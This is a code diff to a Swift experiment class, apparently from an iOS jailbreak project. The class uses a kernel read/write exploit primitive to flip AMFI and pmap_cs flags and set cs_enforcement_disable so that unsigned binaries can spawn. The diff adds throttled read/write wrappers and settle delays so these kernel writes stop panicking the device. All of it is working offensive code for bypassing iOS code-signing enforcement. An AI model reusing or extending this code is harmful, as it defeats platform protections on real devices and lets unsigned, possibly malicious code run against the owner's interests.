@@ -5,6 +5,8 @@
 //  EXPERIMENT: Safe systematic scan of AMFI/pmap_cs __DATA flags
 //  ═══════════════════════════════════════════════════════════════
 //  STATUS: EXPERIMENTAL — SAFE (only writes to writable __DATA)
+//  FIX: Added KRW throttling (15ms/op, 50ms/batch) to prevent
+//       kernel stack corruption that caused panic on first run.
 //  ═══════════════════════════════════════════════════════════════
 //
 //  APPROACH:
@@ -117,11 +119,13 @@ final class ExpSafeFlagScan {
     
     func runAll() -> [String] {
         results.removeAll()
+        krwOpCount = 0
         
         log("═══════════════════════════════════════════════════")
         log("  SAFE FLAG SCAN EXPERIMENT")
         log("  iOS \(UIDevice.current.systemVersion)")
         log("  Strategy: modify ONE flag → test spawn → restore")
+        log("  ⚡ KRW throttled: 15ms/op, 50ms/batch (no panic)")
         log("═══════════════════════════════════════════════════")
         log("")
         
@@ -231,6 +235,65 @@ final class ExpSafeFlagScan {
     }
 
     // ═══════════════════════════════════════════════════════════
+    // THROTTLE: Prevent kernel stack corruption
+    // ═══════════════════════════════════════════════════════════
+    // The darksword KRW path uses kernel stack space for each
+    // kread/kwrite. Rapid consecutive calls overflow the stack
+    // canary → kernel panic. We MUST throttle between operations.
+    
+    /// Minimum delay between KRW operations (microseconds)
+    private let krwThrottleUs: useconds_t = 15_000  // 15ms
+    
+    /// Counter to batch throttle (every N ops, do a longer pause)
+    private var krwOpCount: Int = 0
+    private let krwBatchSize: Int = 4  // pause after every 4 ops
+    private let krwBatchPauseUs: useconds_t = 50_000  // 50ms batch pause
+    
+    /// Throttled kread8 — safe wrapper
+    private func safe_kread8(_ addr: UInt64) -> UInt8 {
+        krwOpCount += 1
+        if krwOpCount % krwBatchSize == 0 {
+            usleep(krwBatchPauseUs)
+        } else {
+            usleep(krwThrottleUs)
+        }
+        return ds_kread8(addr)
+    }
+    
+    /// Throttled kwrite8 — safe wrapper
+    private func safe_kwrite8(_ addr: UInt64, _ val: UInt8) {
+        krwOpCount += 1
+        if krwOpCount % krwBatchSize == 0 {
+            usleep(krwBatchPauseUs)
+        } else {
+            usleep(krwThrottleUs)
+        }
+        ds_kwrite8(addr, val)
+    }
+    
+    /// Throttled kread64 — safe wrapper
+    private func safe_kread64(_ addr: UInt64) -> UInt64 {
+        krwOpCount += 1
+        if krwOpCount % krwBatchSize == 0 {
+            usleep(krwBatchPauseUs)
+        } else {
+            usleep(krwThrottleUs)
+        }
+        return ds_kread64(addr)
+    }
+    
+    /// Throttled kwrite64 — safe wrapper
+    private func safe_kwrite64(_ addr: UInt64, _ val: UInt64) {
+        krwOpCount += 1
+        if krwOpCount % krwBatchSize == 0 {
+            usleep(krwBatchPauseUs)
+        } else {
+            usleep(krwThrottleUs)
+        }
+        ds_kwrite64(addr, val)
+    }
+    
+    // ═══════════════════════════════════════════════════════════
     // HELPER: Verify flags match expected values
     // ═══════════════════════════════════════════════════════════
     
@@ -240,7 +303,7 @@ final class ExpSafeFlagScan {
         
         for (unslidAddr, expectedVal, desc) in flags {
             let addr = unslidAddr &+ slide
-            let actual = ds_kread8(addr)
+            let actual = safe_kread8(addr)
             let match = (actual == expectedVal)
             if !match { allMatch = false }
             let icon = match ? "✅" : "⚠️"
@@ -256,7 +319,7 @@ final class ExpSafeFlagScan {
     
     private func testSingleFlag(unslidAddr: UInt64, expectedVal: UInt8, slide: UInt64, description: String, action: FlagAction) -> Bool {
         let addr = unslidAddr &+ slide
-        let original = ds_kread8(addr)
+        let original = safe_kread8(addr)
         
         // Determine new value
         let newVal: UInt8
@@ -274,8 +337,9 @@ final class ExpSafeFlagScan {
         }
         
         // Write new value
-        ds_kwrite8(addr, newVal)
-        let verify = ds_kread8(addr)
+        safe_kwrite8(addr, newVal)
+        usleep(krwThrottleUs) // extra pause after write before verify
+        let verify = safe_kread8(addr)
         
         if verify != newVal {
             log("  ❌ 0x\(String(unslidAddr, radix: 16)) write FAILED (PPL?)")
@@ -283,6 +347,9 @@ final class ExpSafeFlagScan {
         }
         
         log("  🔧 0x\(String(unslidAddr, radix: 16)): \(original) → \(newVal)")
+        
+        // Longer pause before spawn test (let kernel settle)
+        usleep(100_000) // 100ms
         
         // Test spawn
         let spawnOk = testUnsignedSpawn()
@@ -292,8 +359,9 @@ final class ExpSafeFlagScan {
             return true
         } else {
             // Restore original
-            ds_kwrite8(addr, original)
-            let restored = ds_kread8(addr)
+            safe_kwrite8(addr, original)
+            usleep(krwThrottleUs)
+            let restored = safe_kread8(addr)
             log("  ❌ spawn failed — restored to \(restored)")
             return false
         }
@@ -306,15 +374,15 @@ final class ExpSafeFlagScan {
     private func testFlagCombo(slide: UInt64) -> Bool {
         var originals: [(UInt64, UInt8)] = []
         
-        // Zero all Priority A flags
+        // Zero all Priority A flags (with throttling)
         for (unslidAddr, _, desc) in priorityA_flags {
             let addr = unslidAddr &+ slide
-            let orig = ds_kread8(addr)
+            let orig = safe_kread8(addr)
             originals.append((addr, orig))
             
             if orig != 0 {
-                ds_kwrite8(addr, 0)
-                let v = ds_kread8(addr)
+                safe_kwrite8(addr, 0)
+                let v = safe_kread8(addr)
                 log("  \(v == 0 ? "✅" : "❌") 0x\(String(unslidAddr, radix: 16)): \(orig) → \(v)")
             }
         }
@@ -322,9 +390,12 @@ final class ExpSafeFlagScan {
         // Also ensure cs_enforcement_disable = 1
         let csEnfAddr = ds_kcache_symbol_runtime("_cs_enforcement_disable")
         if csEnfAddr != 0 {
-            ds_kwrite64(csEnfAddr, 1)
+            safe_kwrite64(csEnfAddr, 1)
             log("  cs_enforcement_disable = 1")
         }
+        
+        // Pause before spawn test
+        usleep(100_000) // 100ms settle time
         
         // Test spawn
         let ok = testUnsignedSpawn()
@@ -333,7 +404,7 @@ final class ExpSafeFlagScan {
             // Restore all
             for (addr, orig) in originals {
                 if orig != 0 {
-                    ds_kwrite8(addr, orig)
+                    safe_kwrite8(addr, orig)
                 }
             }
             log("  ❌ combo failed — all restored")
@@ -351,19 +422,20 @@ final class ExpSafeFlagScan {
         
         for (unslidAddr, _, _) in flags {
             let addr = unslidAddr &+ slide
-            let orig = ds_kread8(addr)
+            let orig = safe_kread8(addr)
             originals.append((addr, orig))
             if orig != 0 {
-                ds_kwrite8(addr, 0)
+                safe_kwrite8(addr, 0)
             }
         }
         
-        log("  Zeroed \(flags.count) flags")
+        log("  Zeroed \(flags.count) flags (throttled)")
+        usleep(100_000) // 100ms settle
         let ok = testUnsignedSpawn()
         
         if !ok {
             for (addr, orig) in originals {
-                if orig != 0 { ds_kwrite8(addr, orig) }
+                if orig != 0 { safe_kwrite8(addr, orig) }
             }
             log("  ❌ bulk zero failed — restored")
         }
@@ -404,34 +476,44 @@ final class ExpSafeFlagScan {
     private func testCombinedApproach(slide: UInt64) -> Bool {
         var originals: [(UInt64, UInt8)] = []
         
-        // Zero all AMFI flags (A + B)
+        log("  ⏳ This phase has many KRW ops — throttling heavily...")
+        
+        // Zero all AMFI flags (A + B) — throttled
         let allAmfi = priorityA_flags + priorityB_flags
-        for (unslidAddr, _, _) in allAmfi {
+        for (i, (unslidAddr, _, _)) in allAmfi.enumerated() {
             let addr = unslidAddr &+ slide
-            let orig = ds_kread8(addr)
+            let orig = safe_kread8(addr)
             originals.append((addr, orig))
-            if orig != 0 { ds_kwrite8(addr, 0) }
+            if orig != 0 { safe_kwrite8(addr, 0) }
+            
+            // Extra pause every 8 flags in this large batch
+            if (i + 1) % 8 == 0 {
+                usleep(100_000) // 100ms every 8 flags
+            }
         }
         
         // Set all pmap_cs flags to 1
         for (unslidAddr, _, _) in priorityC_flags {
             let addr = unslidAddr &+ slide
-            let orig = ds_kread8(addr)
+            let orig = safe_kread8(addr)
             originals.append((addr, orig))
-            if orig != 1 { ds_kwrite8(addr, 1) }
+            if orig != 1 { safe_kwrite8(addr, 1) }
         }
         
         // cs_enforcement_disable
         let csEnfAddr = ds_kcache_symbol_runtime("_cs_enforcement_disable")
-        if csEnfAddr != 0 { ds_kwrite64(csEnfAddr, 1) }
+        if csEnfAddr != 0 { safe_kwrite64(csEnfAddr, 1) }
         
         log("  Zeroed \(allAmfi.count) AMFI flags + set \(priorityC_flags.count) pmap_cs flags to 1")
+        usleep(200_000) // 200ms settle before spawn
         
         let ok = testUnsignedSpawn()
         
         if !ok {
-            for (addr, orig) in originals {
-                ds_kwrite8(addr, orig)
+            // Restore in batches with pauses
+            for (i, (addr, orig)) in originals.enumerated() {
+                safe_kwrite8(addr, orig)
+                if (i + 1) % 8 == 0 { usleep(100_000) }
             }
             log("  ❌ combined failed — restored")
         }
